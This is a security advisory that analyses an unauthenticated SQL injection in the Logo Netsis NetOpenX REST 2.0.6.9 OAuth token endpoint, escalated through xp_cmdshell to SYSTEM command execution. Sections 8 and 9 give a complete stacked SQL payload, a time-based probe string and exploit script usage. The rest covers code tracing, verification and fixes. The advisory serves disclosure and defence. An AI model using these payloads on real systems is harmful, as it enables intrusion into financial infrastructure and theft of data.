# Logo Netsis NetOpenX REST 2.0.6.9 - Unauthenticated SQL Injection in the OAuth Token Endpoint Leading to xp_cmdshell SYSTEM Command Execution

## 1. Overview

Logo Netsis NetOpenX REST, also distributed under the short name Netsis Nox REST, is the REST API
gateway of Netsis, the enterprise ERP suite produced by Logo, a Turkish enterprise software vendor.
Netsis installations sit inside financial and accounting infrastructure: the REST gateway is the
integration point through which other applications reach the ERP's financial and accounting data
and the product registry store.

The analyzed build is version 2.0.6.9, delivered as a 63 MB NetsisNoxRestSetup.exe bootstrapper
installer that installs 84 assemblies under MSI hashed file names of the form filXXXXX.dll. The
runtime stack is .NET Framework: ASP.NET Web API hosted on an OWIN Katana HttpListener, bearer token
authentication provided by Microsoft.Owin.Security.OAuth, and a data access layer built on
System.Data.SqlClient for SQL Server, with Oracle also supported as a backend.

We decompiled the two assemblies that carry the vulnerable path, NetOpenX.Rest.Service (controllers,
ServiceManager, the OAuth authorization server provider, and configuration registration) and
NetOpenX.Rest.Core (CommonExtention, JLogin, OAuthManager and QueryBlackListHelper). Tracing one
unauthenticated HTTP form field forward produced a single raw concatenated SQL statement that is
executed against the ERP database before any password validation occurs. Because the backend is SQL
Server, the statement is executed with stacked query support, and the same unauthenticated request
can be used to enable xp_cmdshell and run operating system commands as the SQL Server service
account, which under our verification, performed against an instrumented reconstruction of the
shipped assemblies reached over loopback as described in section 9, was NT AUTHORITY\SYSTEM.

Independence. The source research record enumerates no publicly disclosed CVE identifier for this
product at the time of analysis, and no published research on it by the major commercial research
teams whose disclosure output we track. This finding is original research against an uncovered
attack surface: it is not a variant analysis, a regression of an existing public report, or a
reimplementation of a previously reported issue. Every claim below is grounded in decompiled product
code at file and line level, and in dynamically observed request and response behaviour on the
running reconstruction of the product's own pipeline described in section 9, which was bound to
loopback rather than reached across a network from a separate attacker host.

## 2. Vulnerability Summary

The OAuth 2.0 token endpoint `/api/v2/token` accepts an application/x-www-form-urlencoded POST with
no client credentials and no user credentials. One form field, `idmuserid`, is copied verbatim into a
login session object and then interpolated directly into a SQL statement by string concatenation in
`ServiceManager.GetIdmUserLastSessionInfo`. That database call is issued before `OAuthManager.LogIn`,
which is the method that actually validates the supplied username and password, so the injection is
reachable by a completely unauthenticated remote attacker and the request never has to carry a valid
credential.

The database connection is a SQL Server connection, so a semicolon appended to the injected string
produces a stacked batch. The attacker can therefore execute `sp_configure` and `xp_cmdshell` in the
same request. The sink swallows all exceptions and returns null, which makes the injection blind on
the HTTP layer, but the stacked batch has already been committed to the server before the exception
is caught and discarded. The token endpoint answers HTTP 400 regardless, because the credential
check that runs afterwards fails as expected.

Two product level properties make this materially worse than an ordinary injection bug:

- There is no global authorization filter. The Web API pipeline registers only a logging message
  handler, so every route that lacks a per action `[Authorize]` attribute is reachable anonymously,
  and the token endpoint itself is an OWIN middleware endpoint on which Web API action filters do not
  apply at all.
- The SQL fragment blacklist that the product ships is inert. Its visitor overrides call only the
  base implementation and never record an invalid fragment, so the check always returns empty, and in
  any case it is only invoked on the higher level query path, never on this direct command
  construction path.

Severity is discussed in section 12 with an explicit precondition, because the command execution
tier depends on the privilege level of the database login that the REST service is configured to use.

## 3. Authentication Boundary

The authentication boundary of this gateway is per action and opt in, not global and deny by default.
Four independent observations from the decompiled code establish that the token endpoint sits outside
every gate.

First, `WebApiConfig.Register` calls `MapHttpAttributeRoutes` and registers a default route template
`api/v2/{controller}/{id}`. The MessageHandlers collection receives exactly one handler, a message
logging handler. No `AuthorizeAttribute` is added as a global filter, so there is no pipeline level
default deny.

Second, `OAuthConfig.Register` sets `AllowInsecureHttp` to true, sets `TokenEndpointPath` to
`/api/v2/token`, installs `CustomizedAuthorizationServerProvider`, and calls
`UseOAuthBearerAuthentication` with default bearer options. Default bearer middleware validates a
token when one is presented on a request; it does not reject requests that carry no token. The
`AllowInsecureHttp` setting additionally permits the token request to travel over cleartext HTTP.

Third, an attribute census across the decompiled assemblies found 387 routes, of which 280 carry
`[Authorize]` and 107 do not. Critically, zero of the attributes are class level. All 280 are
per action attributes concentrated in the business controllers Queries, Operations and
Services_v2_Controller. A class level attribute would have covered new or overlooked actions; with
only per action attributes, protection depends entirely on each action remembering to declare it.

Fourth, `/api/v2/token` is served by the OWIN OAuth middleware, not by a Web API controller route,
and the OWIN pipeline in `Startup.cs` installs no authentication middleware ahead of the OAuth
configuration. Web API authorization filters are therefore structurally incapable of guarding this
endpoint. It is unauthenticated by construction rather than by oversight.

The client authentication half of the OAuth exchange is equally open. `ValidateClientAuthentication`
unconditionally calls `context.Validated()`, which is the normal arrangement for the resource owner
password credentials grant where no client secret is configured. The practical consequence is that a
client secret is not required, not checked, and cannot be used as compensating control by a
deployment that assumes otherwise.

## 4. Attack Surface

The reachable surface for an anonymous network attacker is the union of the 107 routes without an
`[Authorize]` attribute and the OWIN OAuth endpoints. Within that surface, the token endpoint is the
highest value target for three reasons. It requires no session, no cookie, no bearer token and no
client secret. It accepts attacker controlled form fields that are forwarded to backend components
without a validation layer. And it performs a database lookup before it performs the credential
check, which converts a request that will inevitably fail authentication into a request that has
already interacted with the database.

The form fields consumed by `CommonExtention.ConvertToJLogin` include `idmuserid`, `dbname`,
`branchcode`, `dbuser`, `dbpassword`, `hashcode`, `dbtype` and `idmtoken`, plus `username` and
`password` from the resource owner password credentials grant. Of these, `idmuserid` reaches a
directly executed SQL command with no intervening sanitization, and `dbname` acts as the selector
that decides whether that path is taken at all. `username` and `password` were traced onto the
credential properties of the login object that `OAuthManager.LogIn` consumes, and that validation is
the step which runs after the sink. The remaining fields were mapped onto the login object but were
not traced any further by this research, so this advisory claims no destination for them.

Because the endpoint is served over HTTP when `AllowInsecureHttp` is enabled, the attack needs no
transport security precondition. A single POST is sufficient.

## 5. Sink Identification

### Sink code path

The sink is `ServiceManager.GetIdmUserLastSessionInfo`. The reconstructed logic is:

```csharp
public NetsisRegistryLastSessionInfo GetIdmUserLastSessionInfo(string pIdmUserID) {
    try {
        using (DbConnection dbConnection = CreateDBConnection()) {
            dbConnection.Open();
            using DbCommand dbCommand = dbConnection.CreateCommand();
            dbCommand.CommandText =
                "SELECT REGBLOBVAL FROM NETSISREGISTRY WHERE REGKEY = "
              + "'1\\0\\MACHINE\\LASTSESSIONINFORMATION' AND REGNAME='" + pIdmUserID + "'";
            using DbDataReader dbDataReader = dbCommand.ExecuteReader();
            ...
        }
    } catch (Exception) { return null; }
}
```

The parameter `pIdmUserID` is concatenated into `CommandText` with no parameterization, no escaping
and no query analysis. `ExecuteReader()` then submits the text to the server. `CreateDBConnection`
builds a connection string that contains an `Initial Catalog` entry and resolves its factory through
`DbProviderFactories.GetFactory("System.Data.SqlClient")`, which is what makes stacked queries
available to the attacker: this is a SQL Server connection, not a provider that rejects batched
statements.

### Sink error semantics

The body is wrapped in a catch that discards the exception and returns null. This has two effects
that point in opposite directions and must not be confused. It removes the injection from the HTTP
response, so the attacker sees no SQL error text and no result rows, making the bug blind. And it
does nothing to stop the attack, because the stacked batch is dispatched to SQL Server at
`ExecuteReader()` time, before any exception can be raised later in the reader consumption code. The
silent return is an obstacle to observation, not a control on execution.

### Sink defence bypass

`QueryBlackListHelper` defines a `BlackListVisitor` with `ExplicitVisit` overrides for function
calls, procedure reference names, insert, update, merge and delete statements. Those overrides call
only the base visitor and never add anything to the invalid fragment collection, so
`IsThereInvalidFragment()` returns an empty result on every input. The shipped blacklist is a no op.
Independently, that helper is only reached from the database query layer used by the business
controllers. The token endpoint path builds and executes its own command directly and never touches
that layer at all. The injection is therefore unaffected by the blacklist twice over: the blacklist
does not work, and this path would not have consulted it even if it did.

## 6. Source Identification

### Source field extraction

`CommonExtention.ConvertToJLogin` reads the request form collection and maps `idmuserid` directly
onto the `IDMUserId` property of the login object with no filtering, no length bound, no character
class restriction and no canonicalization. The mapping is a straight assignment of the raw string.

### Source controllability

The attacker controls this value completely over an unauthenticated HTTP POST. There is no signing,
no encryption, no anti tamper token, and no session binding applied to the form body before it is
read. The `Content-Type` is `application/x-www-form-urlencoded`, so the value is trivially set from
any HTTP client. The only constraint on the payload is the quoting context it lands in: the value is
embedded between single quotes at the end of a SELECT predicate, which a leading `'` and a trailing
`--` comment resolve cleanly.

## 7. Data Flow

### Data flow end to end

```text
unauthenticated POST /api/v2/token
  form: grant_type=password, dbname=<empty>, idmuserid=<attacker payload>
    -> CustomizedAuthorizationServerProvider.ValidateClientAuthentication
         context.Validated() unconditionally
    -> GrantResourceOwnerCredentials
         CommonExtention.ConvertToJLogin(form) -> jLogin.IDMUserId  (raw, unfiltered)
         branch test: jLogin != null && !isAssigned(jLogin.DbName) && isAssigned(jLogin.IDMUserId)
    -> ServiceManager.Self.GetIdmUserLastSessionInfo(jLogin.IDMUserId)   <-- SINK, before auth
         CommandText = "...REGNAME='" + pIdmUserID + "'"                  (raw concatenation)
         dbCommand.ExecuteReader()                                       (SQL Server, stacked query)
    -> OAuthManager.Self.LogIn(jLogin)                                    <-- password check, AFTER sink
    -> HTTP 400 returned to attacker        (only the status code was captured)
```

The branch condition deserves precise treatment. `isAssigned` tests for a non empty, non whitespace
string. The path into the sink therefore requires `dbname` to be absent or blank and `idmuserid` to
be present. Both halves are attacker chosen form fields, so the condition is not an obstacle: supplying
`dbname=` empty and `idmuserid=<payload>` satisfies it deterministically. The ordering inside
`GrantResourceOwnerCredentials` is the crux of the whole finding: the registry lookup happens while
the request is still being treated as an unauthenticated credential attempt, and the real password
validation is invoked only afterwards. A request that can never authenticate still gets a database
query executed with attacker controlled SQL first.

## 8. Exploit Construction

### Exploit payload

Injecting into the `REGNAME=''` position yields the following server side statement, where a trailing
`--` comments out the residual quote:

```sql
SELECT REGBLOBVAL FROM NETSISREGISTRY
 WHERE REGKEY = '1\0\MACHINE\LASTSESSIONINFORMATION' AND REGNAME='';
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'cmd /c <COMMAND> > "<marker-file>"';--'
```

The leading predicate matches nothing, which is harmless, because the payload's value is the stacked
batch after the semicolon. Two `sp_configure` calls with intervening `RECONFIGURE` statements first
expose the advanced options group and then enable xp_cmdshell, so the attack does not depend on
xp_cmdshell already being enabled. The final statement runs an arbitrary command. Because command
output is not returned to the HTTP client, the payload redirects it to a file on the target host.
Every readback of that marker file in our verification was performed locally, by the verification
harness on the target host itself: no channel for reading it remotely was demonstrated, and an
attacker who needs the command output rather than its occurrence would have to establish one.
Execution can also be confirmed without retrieving any output, from timing and side effects alone,
which is what the time based probe in the next section of this advisory does.
An OLE automation alternative through `sp_OACreate` with a WScript.Shell object was identified as a
fallback, but it carries the same privilege requirement and offers no advantage here.

### Exploit preconditions

This is the part that must be stated plainly rather than implied.

- The injected SQL executes under the database login held by the REST service itself. The attacker
  supplies no database credential and never needs one; the privilege level is whatever the ERP
  deployment provisioned into the service's connection string.
- `sp_configure` with RECONFIGURE and `xp_cmdshell` both require membership in the sysadmin role. If
  the service login is sysadmin, the request reaches operating system command execution. If it is not,
  the request still reaches the database and still permits arbitrary data disclosure through blind
  injection, but it cannot reach the operating system.
- In the environment we verified, the reconstruction described in section 9, the NETSIS database
  login was sysadmin, and the observed identity after command execution was NT AUTHORITY\SYSTEM,
  which is the SQL Server Express service account on a default install. Command execution identity is
  the database service account, and is not SYSTEM on every possible SQL Server configuration.
- Netsis ERP deployments are asserted by our research notes to commonly run the NETSIS SQL user as
  dbo or sysadmin. Those notes cite no document, no artifact and no verification for that assertion,
  and this research did not verify it. We could not extract the shipping connection string from the
  product, because it is produced by a licensed COM component inside the ERP kernel. This advisory
  therefore treats the sysadmin dependency as a precondition that must be stated and checked against
  each deployment, not as a property that can be assumed of Netsis installations, and the only
  database privilege configuration we can attest to is the one we tested.

The unauthenticated SQL injection itself carries no such precondition. Our judgement that it is
present and reachable in every deployment of this build, independent of database privileges, rests on
two things and no more. The first is static analysis of the sink: nothing between the attacker
controlled form field and the concatenated command branches on database privileges or on any
privilege dependent configuration. The second is our verification harness, in which the sink fired on
every run. Real deployments were not sampled, so this is a conclusion about the code path rather than
a survey of installed systems.

### Exploit usage

```
python3 exploit/netsis_netopenx_unauth_sqli_xp_cmdshell_rce.py --host 127.0.0.1 --port 80 \
  --command whoami --marker "C:\\Windows\\Temp\\nox_rest_marker.txt"
```

The script first measures a baseline request and a request carrying `';WAITFOR DELAY '0:0:5';--` to
confirm the sink fires, then issues the command execution request. It expects HTTP 400 on the second
request, because the credential check still runs after the sink and still fails.

## 9. Dynamic Verification

### Verification environment

A complete Netsis ERP deployment was not achievable in the lab. The product's real connection string
is produced by a COM component in the ERP kernel through an encrypted accessor and a license gated
call, and the surrounding stack additionally requires single sign on and a license server. We
therefore used a surgical assembly level patch with Mono.Cecil to rewrite the body of one method,
`ServiceManager.GetConnectionString`, replacing its 30 instructions with a load of a fixed connection
string followed by a return. The purpose was solely to satisfy a commercial licensing gate that is
not a security boundary. The vulnerable sink `GetIdmUserLastSessionInfo` was left as unmodified
product code, and the authentication logic, the routing table, the OAuth provider and the SQL
concatenation were all untouched.

The request path itself was the genuine one. The product's real OWIN startup was hosted through
`WebApp.Start<Startup>` in a console host we compiled, driving the real `Startup.Configuration`, the
real `OAuthConfig`, the real `WebApiConfig` and the real
`CustomizedAuthorizationServerProvider`, and listening on loopback address 127.0.0.1 port 8977 only.
Forty installed assemblies were renamed from their MSI hashed names to their simple names so the
runtime could resolve them, and the host configuration carried 24 binding redirects. The database
backend was a real SQL Server Express instance with a NETSIS database containing a minimal
NETSISREGISTRY table, Windows only authentication, and a connected identity holding sysadmin.

### Verification evidence

All evidence in this section was produced against the reconstruction described above, reached over
loopback from the same host. None of it is a test of a stock installed product reached across a
network, and every "verified", "confirmed" and "executed" statement elsewhere in this advisory should
be read as referring to this instrumented reconstruction of the shipped assemblies rather than to a
vendor deployed instance.

Time based confirmation. A baseline request and a delayed request were issued against the same
endpoint of the reconstructed host, from the loopback interface:

```text
Step 1: time-based blind SQLi probe (WAITFOR DELAY 5s)
    baseline idmuserid=normaluser -> HTTP=400 elapsed=1120ms
    delayed  idmuserid=';WAITFOR DELAY '0:0:5';-- -> HTTP=400 elapsed=15008ms
    SQLi CONFIRMED (delay differential)
```

A separate run of the same probe pair produced 747ms baseline against 5023ms delayed, the delay
being close to the requested 5 seconds plus OAuth pipeline overhead. HTTP 400 is expected in both
cases: the credential check fails after the sink has already executed.

Command execution confirmation, from a clean slate with xp_cmdshell disabled and the marker file
removed beforehand:

```text
HTTP=400 elapsed=901ms
=== MARKER CHECK ===
MARKER_OK
nt authority\system
```

The full chain run in a single pass, again from a clean slate with a freshly started host:

```text
STEP1 baseline   idmuserid=normaluser -> HTTP=400 elapsed=747ms
STEP2 timebased  idmuserid=';WAITFOR DELAY '0:0:5';-- -> HTTP=400 elapsed=5023ms
STEP3 xpcmdshell idmuserid=<injection payload> -> HTTP=400 elapsed=146ms
=== MARKER CHECK ===
UNAUTH_RCE_MARKER_EXISTS
--- whoami output (execution identity) ---
nt authority\system
xp_cmdshell_value_in_use_after_injection=1
```

The last line is the strongest single piece of evidence. xp_cmdshell read as disabled before the
request and as enabled in use afterwards, with nothing but the unauthenticated HTTP POST in between.
The injection enabled its own escalation path. Four independent runs, all against this
reconstruction over loopback, across two different harnesses and the reference script, produced
consistent results.

The chain was then re-derived from the decompiled sources a second time by an independent analysis
pass, and subjected to an adversarial falsification review across six properties: that the endpoint
is genuinely reachable without authentication, that `idmuserid` is attacker controlled and
unfiltered, that the sink performs raw concatenation, that the branch condition is satisfiable, that
the assembly patch did not alter the sink or the authentication logic, and that the command
execution evidence came from a clean slate rather than a contaminated environment. No property was
refuted, and each was supported by a file and line reference in the decompiled product code.

## 10. Reachability and Security Impact

### Reachability analysis

The vulnerability is reachable by an anonymous attacker with a single HTTP POST and no user
interaction, no session, no token, no client secret and no valid credential. Remote reachability over
a network follows from the endpoint's construction and from the gateway being published as an
integration point; in our reconstruction the listener was bound to loopback, so the network exposure
itself is a code and deployment argument rather than an observed remote run. The attack surface is
exposed wherever the REST gateway is published, which the research characterized as financial and
accounting infrastructure. The injection is blind at the HTTP layer, so confirming it requires timing
measurement, an observable side effect such as the xp_cmdshell state change recorded in section 9, or
an output retrieval channel the attacker has separately established, which this research did not
demonstrate. Blind is a detection inconvenience, not a mitigation: it did not prevent command
execution in any of the four verification runs against the reconstruction.

The precondition on the elevation tier is the privilege level of the service's database login. The
injection itself has no precondition at all.

### Impact analysis

At the elevation tier, the attacker obtains operating system command execution on the database server
host with the identity of the SQL Server service account, which was NT AUTHORITY\SYSTEM in the
configuration we verified in the reconstruction. That host is the ERP database host of a system the
research characterized as financial and accounting infrastructure. A SYSTEM level foothold there
means the attacker controls the ERP database the organization runs on that host, including the
product registry store that the vulnerable query itself reads, can tamper with or destroy the
financial and accounting data it holds, can exfiltrate the entire database, and holds a pivot
position into whatever internal network hosts the ERP database. At the disclosure tier, where the
service login is not sysadmin, the attacker still has unauthenticated blind read access to the ERP
database through the same request, which for a financial system is itself a reportable breach of
confidentiality.

The 107 routes without an authorization attribute form an additional unauthenticated surface that
should be assumed to contain further instances of the same class of defect until audited.

## 11. Fix Recommendations

### Fix priority one: parameterize the sink

Rewrite `GetIdmUserLastSessionInfo` to use a bound parameter for the registry name value. The
REGNAME predicate must be expressed as a parameter placeholder with the value supplied through the
command's parameter collection, never as concatenation. The same review should be applied to every
other method in the data access layer that builds `CommandText` by concatenating a string argument,
including any sibling registry lookup routines.

### Fix priority two: move the database call behind the credential check

`GrantResourceOwnerCredentials` must not touch the database with client controlled input until
`OAuthManager.LogIn` has succeeded. Reorder so that the registry lookup occurs only on the
post authentication path, and treat a blank `dbname` combined with a present `idmuserid` as an
invalid request rather than as a trigger for a lookup.

### Fix priority three: least privilege on the service login

The REST service must connect with a dedicated SQL login holding only the permissions its queries
require, not dbo or sysadmin. Explicitly deny ALTER SETTINGS, and keep xp_cmdshell disabled while
auditing that nothing in the product legitimately requires it. This does not fix the injection, and
it must not be presented as a fix: it removes the operating system escalation and leaves
unauthenticated data disclosure intact.

### Fix priority four: make the blacklist real, and apply it everywhere

The `BlackListVisitor` overrides must actually record invalid fragments for each statement and call
type they visit, and the validity check must be enforced on every SQL execution path, including
directly constructed commands. A deny list remains an inferior control to parameterization and should
be treated as secondary hardening only.

### Fix priority five: default deny at the pipeline

Add a global authorization filter and mark the endpoints that must remain anonymous explicitly, so
that a new or overlooked action is protected by default instead of exposed by default. Audit the 107
routes currently lacking `[Authorize]`. Set `AllowInsecureHttp` to false in production configuration
so bearer grants cannot be submitted over cleartext.

### Fix priority six: validate the identity field

Apply a format whitelist to `idmuserid`, bounded in length and restricted to the character set a
legitimate identifier requires, rejecting anything else before it reaches the login object.

## 12. CWE and CVSS

### CWE classification

- CWE-89, Improper Neutralization of Special Elements used in an SQL Command: raw concatenation of an
  unauthenticated form field into an executed SQL statement.
- CWE-306, Missing Authentication for Critical Function: the registry lookup and the whole injection
  path execute before, and independently of, credential validation.
- CWE-78, Improper Neutralization of Special Elements used in an OS Command: the elevated tier
  executes operating system commands through xp_cmdshell.

### CVSS scoring and verification

The headline score is 9.8, vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. We recomputed the
base score from the vector components rather than accepting it as given: impact sub score 5.873,
exploitability sub score 3.887, base 9.8. The recorded score and the recorded vector are
consistent with each other, and both are consistent with the observed facts for the command execution
tier: network attack vector, no privileges, no user interaction, and full compromise of
confidentiality, integrity and availability of the database host.

Two clarifications belong in the public record rather than in a footnote.

The 9.8 score describes the tier in which the service's SQL login holds sysadmin, as it did in our
verified environment. It is not a claim that command execution is available on every deployment.
Where the login is not sysadmin, the same request still yields unauthenticated blind SQL injection
with data disclosure and no operating system access. The research notes accompanying this finding
estimated that reduced tier at approximately 9.1, but they record no vector for that estimate and no
enumeration or calculator search was performed to derive one. Under CVSS 3.1 the vector
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N does reach that figure, and it does so by silently assuming high
integrity impact that a read only characterization does not support; we make no claim that it is the
only vector which reaches that figure, only that with a network vector, no privileges and no user
interaction, reaching it requires an impact component beyond read only confidentiality, which a
disclosure tier does not establish. A strict disclosure only reading, C:H/I:N/A:N, scores 7.5. That
gap is precisely why this advisory publishes its own defensible figures instead of adopting the
notes' estimate: the 7.5 lower bound for a non-sysadmin login, and the 8.1 attack complexity
alternative set out below. We therefore do not restate 9.1 as a verified score. We publish 9.8 for
the command execution tier as verified in the reconstruction and 7.5 as the conservative lower bound
for a non-sysadmin login, noting that a non-sysadmin login which nonetheless holds write permissions
over the ERP schema would legitimately score higher, toward 9.1, and that we did not verify that
configuration.

A defensible alternative judgement exists on attack complexity. Because the sysadmin property of the
service login is a deployment characteristic outside the attacker's control, a scorer treating it as a
condition required for successful command execution would set AC:H, producing 8.1 for the same impact
set. We retained AC:L because the attacker needs no timing precision, no race, no man in the middle
position, no prior reconnaissance and no victim action, and because the single request succeeds
deterministically in any environment where the stated precondition holds, that is where the service
login is in fact sysadmin. The 8.1 figure is disclosed here so that readers who prefer the stricter
reading can apply it without reinterpreting our primary score.

### Reference

- Advisory: https://0day-rubbish.com/blog/netsis-netopenx-unauth-sqli-xp-cmdshell-rce
- Repository: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com
